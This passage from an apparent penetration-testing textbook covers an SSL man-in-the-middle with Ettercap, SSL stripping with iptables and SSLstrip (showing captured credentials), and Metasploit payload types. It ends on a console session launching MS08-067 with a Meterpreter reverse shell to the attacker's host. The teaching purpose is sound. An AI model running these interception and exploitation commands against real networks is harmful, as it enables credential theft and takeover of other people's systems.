able to get any sensitive information out of the encrypted connection. For
this next attack, we’ll rely on a user’s willingness to click past an SSL certifi-
cate warning to perform a man-in-the-middle attack and get the plaintext
out of a Secure Sockets Layer (SSL) connection, which encrypts traffic to
protect it from being read by an eavesdropper.
SSL Basics
The goal of SSL is to provide reasonable assurance that any sensitive infor-
mation (such as credentials or credit card numbers) transmitted between
a user’s browser and a server is secure—unable to be read by a malicious
entity along the way. To prove that the connection is secure, SSL uses cer-
tificates. When you browse to an SSL-enabled site, your browser asks the
site to identify itself with its SSL certificate. The site presents its certifi-
cate, which your browser verifies. If your browser accepts the certificate, it
informs the server, the server returns a digitally signed acknowledgment,
and SSL-secured communication begins.
170 Chapter 7
An SSL certificate includes an encryption key pair as well as identifying
information, such as the domain name and the name of the company that
owns the site. A server’s SSL certificate is generally vouched for by a certifi-
cate authority (CA) such as VeriSign or Thawte. Browsers come preinstalled
with a list of trusted CAs, and if a server’s SSL certificate is vouched for by
a trusted CA, the browser can create a secure connection. If the certificate
is untrusted, the user will be presented with a warning that basically says,
“The connection might be secure, but it might not be. Proceed at your
own risk.”
Using Ettercap for SSL Man-in-the-Middle Attacks
In our ARP cache poisoning attack, we man-in-the-middled the traffic
between our Windows XP and Ubuntu targets (as well as the Ubuntu tar-
get and the Internet). These systems were still able to communicate with
each other, but our Kali system was able to capture the traffic. We can do
the same thing to attack SSL traffic. We can break the secure SSL connec-
tion by redirecting traffic to and from www .facebook.com to our Kali system
so we can intercept sensitive information.
For this example, we’ll use Ettercap, a multifunction suite for man-in-
the-middle attacks that, in addition to SSL attacks, can also complete all
of the attacks we have performed so far with Arpspoof and Dnsspoof. Turn
off any other spoofing tools before starting Ettercap. See page 22 for con-
figuration instructions.
Ettercap has multiple interfaces, but we will use the -T option for the
text-based interface in this example. Use the -M option with arp:remote
/gateway/ /target/ to set up an ARP cache poisoning attack between the
default gateway and the Linux target, as shown next. The actual attack
will work the same way as our previous exercise with Arpspoof.
root@kali:~# ettercap -Ti eth0 -M arp:remote /192.168.20.1/ /192.168.20.11/
With Ettercap running, we just wait for users to start interacting with
SSL-based web servers. Switch over to your Linux target, and attempt to log
in to a website using SSL. You should be greeted with a certificate warning
like the one in Figure 7-12.
Because this is a man-in-the-middle attack, the SSL session’s security
cannot be verified. The certificate Ettercap presents isn’t valid for www
.facebook.com, so the trust is broken, as illustrated in Figure 7-13.
But security warnings don’t stop all users. If we click through the warn-
ing and enter our credentials, Ettercap will grab them in plaintext before
forwarding them on to the server, as shown here:
HTTP : 31.13.74.23:443 -> USER: georgia PASS: password INFO: https://www.facebook.com/
Capturing Traffic 171
Figure 7-12: Facebook cannot be verified.
www.facebook.com
HTTPS response from
www.facebook.com
HTTPS request for
www.facebook.com
HTTPS request for
Internet
www.facebook.com
Ubuntu target Kali
HTTPS response from
www.facebook.com
(certificate from Ettercap is
invalid for www.facebook.com)
Figure 7-13: SSL man-in-the-middle attack
172 Chapter 7
ssL stripping
Of course, the trouble with SSL man-in-the-middle attacks is that users have
to click through the SSL certificate warning. Depending on the browser,
this can be an involved process that is difficult, if not impossible, for a user
to ignore. Most readers can probably think of a time they clicked through a
security warning and continued to the page despite their better judgment.
(Case in point: Our default Nessus install uses Tenable’s self-signed certifi-
cate, which throws a certificate error when you browse to the web interface.
If you chose to follow along with that example, you most likely decided to
click through the warning.)
It is difficult to say how effective certificate warnings are at stopping
users from visiting HTTPS sites without valid certificates. I have run social-
engineering tests that employed self-signed SSL certificates, and the success
rate has been significantly lower than those with valid certificates or those
that don’t use HTTPS. Though some users did click through and visit the
sites, a more sophisticated attack would allow us to capture information in
plaintext without triggering those obvious warnings that the SSL connec-
tion is compromised.
With SSL stripping, we man-in-the-middle the HTTP connection before
it is redirected to SSL and add SSL functionality before sending the pack-
ets on to the web server. When the web server replies, SSL stripping again
intercepts the traffic and removes the HTTPS tags before sending the pack-
ets to the client. This technique is illustrated in Figure 7-14.
www.facebook.com
HTTPS response from
www.facebook.com
HTTPS request for
www.facebook.com
HTTP request for
Internet
www.facebook.com
Ubuntu target Kali
HTTP response from
www.facebook.com
Figure 7-14: SSL stripping attack
Moxie Marlinspike, the author of SSLstrip, called certificate warnings
negative feedback, as opposed to positive feedback that a session is valid, such as
seeing HTTPS in the browser URL bar. Avoiding this negative feedback is
Capturing Traffic 173
much more important to an attack’s success than including positive feed-
back because users are naturally less likely to notice that a URL says HTTP
instead of HTTPS than they are a giant certificate warning they have to
actively click through. SSL stripping avoids the certificate warning by again
man-in-the-middling the connection.
Users typically encounter HTTPS either through clicking links or
through HTTP 302 redirects. Most users don’t enter https://www.facebook.com
or even http://www.facebook.com into their browsers; they type www.facebook
.com or sometimes just facebook.com. And that’s why this attack is possible.
SSLstrip adds the HTTPS itself and thus the SSL connection between
Facebook and Kali is valid. SSLstrip just turns the connection back to
HTTP to send to the original requester. There is no certificate warning.
Using SSLstrip
The tool SSLstrip implements SSL stripping. Before we start it, we need to set
an Iptables rule to pass traffic that is headed to port 80 through SSLstrip.
We’ll run SSLstrip on port 8080, as shown next, then restart Arpspoof and
spoof the default gateway. (For instructions, jump back to “Using ARP
Cache Poisoning to Impersonate the Default Gateway” on page 165.)
root@kali:# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
Now start SSLstrip, and tell it to listen on port 8080 with the -l flag.
root@kali:# sslstrip -l 8080
Next, browse to a site that uses SSL (try any Internet site that requires
login credentials) from your Linux target, like the Twitter login page shown
in Figure 7-15. As you can see, HTTP has replaced HTTPS in the address bar.
When you log in, your credentials will be reported in plaintext by SSLstrip.
(No, my Twitter password isn’t really “password.”)
This attack is more sophisticated than a straight SSL man-in-the-middle
attack. We are able to avoid the certificate warning because the server is
completing an SSL connection with SSLstrip rather than the browser.
2015-12-28 19:16:35,323 SECURE POST Data (twitter.com):
session%5Busername_or_email%5D=georgiaweidman&session%5Bpassword%5D=password&s
cribe_log=&redirect_after_login=%2F&authenticity_token=a26a0faf67c2e11e6738053
c81beb4b8ffa45c6a
As you can see, SSLstrip reports the entered credentials (georgiaweidman:
password) in plaintext.
174 Chapter 7
Figure 7-15: Twitter login page with SSLstrip running
summary
In this chapter we’ve fiddled with network traffic to create some interesting
results. Using various tools and techniques, we were able to intercept traffic
that we had no business seeing in a switched network. We used ARP cache
poisoning to redirect traffic in a switched network to our Kali system and
DNS cache poisoning to redirect users to our web servers. We used Ettercap
to automate an SSL man-in-the-middle attack and (assuming that the user
clicks through a warning) capture sensitive information in plaintext. Finally,
we made the attack even more sophisticated by avoiding an invalid certifi-
cate warning using SSL stripping.
Capturing traffic from the local network can glean useful information
for our pentest. For example, we were able to capture valid credentials for
the FTP server for use in exploitation.
Speaking of exploitation, let’s get started.
Capturing Traffic 175
PaRT III
at taCks
8
e xPloitation
After all that preparatory work we finally get to the
fun stuff: exploitation. In the exploitation phase of
the pentest, we run exploits against the vulnerabilities
we have discovered to gain access to target systems.
Some vulnerabilities, such as the use of default pass-
words, are so easy to exploit, it hardly feels like exploi-
tation at all. Others are much more complicated.
In this chapter we’ll look at exploiting the vulnerabilities we identified in
Chapter 6 to gain a foothold in target machines. We’ll return to our friend
MS08-067 from Chapter 4, now that we have more background about the
vulnerability. We’ll also exploit an issue in the SLMail POP3 server with a
Metasploit module. In addition, we’ll piggyback on a previous compromise
and bypass login on the FTP server on our Linux target. We will exploit
a vulnerability in the TikiWiki install on the Linux target and a couple of
default password issues on an XAMPP install on the Windows target. We’ll
also take advantage of a readable and writable NFS share to take control of
the SSH keys and log in as a valid user without knowing the password. We
will interact with a fragile web server on a nonstandard port to take advan-
tage of a directory traversal issue and download system files. For a refresher
on how we discovered each of the issues we’ll use for exploitation, refer
back to Chapter 6.
revisiting ms08-067
We know from Chapter 6 that the SMB server on our Windows XP target is
missing the MS08-067 patch. The MS08-067 vulnerability has a good repu-
tation for successful exploits, and the corresponding Metasploit module is
ranked as great. We used this vulnerability as an example in Chapter 4, but
the knowledge we gained in the previous chapters gives us solid evidence
that this exploit will result in a compromise.
When we viewed the options for the windows/smb/ms08_067_netapi mod-
ule in Chapter 4, we saw the usual RHOST and RPORT as well as SMBPIPE, which
allows us to set the pipe that our exploit will use. The default is the browser
pipe, though we can also use SRVSRC. In Chapter 4, we ran the Metasploit
module scanner/smb/pipe_auditor to enumerate the listening SMB pipes
and found that only the browser pipe is available. Thus, we know that the
default SMBPIPE option, BROWSER, is the only one that will work.
Metasploit Payloads
As we discussed in Chapter 4, payloads allow us to tell an exploited system
to do things on our behalf. Though many payloads are either bind shells,
which listen on a local port on the target machine, or reverse shells, which
call back to a listener on the attack system, other payloads perform specific
functions. For example, if you run the payload osx/armle/vibrate on an iPhone,
the phone will vibrate. There are also payloads to add a new user account:
linux/x86/adduser for Linux systems and windows/adduser for Windows.
We can download and execute a file with windows/download_exec_https or
execute a command with windows/exec. We can even use the speech API to
make the target say “Pwned” with windows/speak_pwned.
Recall that we can see all the payloads available in Metasploit by enter-
ing show payloads at the root of Msfconsole. Enter this command after you
tell Metasploit to use the windows/smb/ms08_067_netapi module so you can
see only payloads that are compatible with the MS08-067 exploit.
In Chapter 4, we used windows/shell_reverse_tcp, but looking through the
list, we also see a payload called windows/shell/reverse_tcp.
windows/shell/reverse_tcp normal Windows Command Shell, Reverse TCP Stager
windows/shell_reverse_tcp normal Windows Command Shell, Reverse TCP Inline
180 Chapter 8
Both payloads create Windows command shells using a reverse connec-
tion (discussed in Chapter 4). The exploited machine will connect back to
our Kali machine at the IP address and port specified in the payload options.
Any of the payloads listed for the windows/smb/ms08_067_netapi will work just
fine, but in different pentesting scenarios, you may have to get creative.
Staged Payloads
The windows/shell/reverse_tcp payload is staged. If we use it with the windows/
smb/ms08_067_netapi exploit, the string sent to the SMB server to take
control of the target machine does not contain all of the instructions to
create the reverse shell. Instead, it contains a stager payload with just enough
information to connect back to the attack machine and ask Metasploit for
instructions on what to do next. When we launch the exploit, Metasploit
sets up a handler for the windows/shell/reverse_tcp payload to catch the incom-
ing reverse connection and serve up the rest of the payload—in this case
a reverse shell—then the completed payload is executed, and Metasploit’s
handler catches the reverse shell. The amount of memory space available for
a payload may be limited, and some advanced Metasploit payloads can take
up a lot of space. Staged payloads allow us to use complex payloads without
requiring a lot of space in memory.
Inline Payloads
The windows/shell_reverse_tcp payload is an inline, or single, payload. Its
exploit string contains all the code necessary to push a reverse shell back
to the attacker machine. Though inline payloads take up more space
than staged payloads, they are more stable and consistent because all
the instructions are included in the original exploit string. You can dis-
tinguish inline and staged payloads by the syntax of their module name.
For example, windows/shell/reverse_tcp or windows/meterpreter/bind_tcp are
staged, whereas windows/shell_reverse_tcp is inline.
Meterpreter
Meterpreter is a custom payload written for the Metasploit Project. It is
loaded directly into the memory of an exploited process using a technique
known as reflective dll injection. As such, Meterpreter resides entirely in mem-
ory and writes nothing to the disk. It runs inside the memory of the host
process, so it doesn’t need to start a new process that might be noticed by an
intrusion prevention or intrusion detection system (IPS/IDS). Meterpreter
also uses Transport Layer Security (TLS) encryption for communication
between it and Metasploit. You can think of Meterpreter as a kind of shell
and then some. It has additional useful commands that we can use, such as
hashdump, which allows us to gain access to local Windows password hashes.
(We’ll look at many Meterpreter commands when we study post exploita-
tion in Chapter 13.)
Exploitation 181
We saw in Chapter 4 that Metasploit’s default payload for the windows/
smb/ms08_067_netapi is windows/meterpreter/reverse_tcp. Let’s use the windows/
meterpreter/reverse_tcp payload with our MS08-067 exploit this time. Our pay-
load options should be familiar from other reverse payloads we have used
so far. Let’s set our payload and run the exploit, as shown in Listing 8-1.
msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English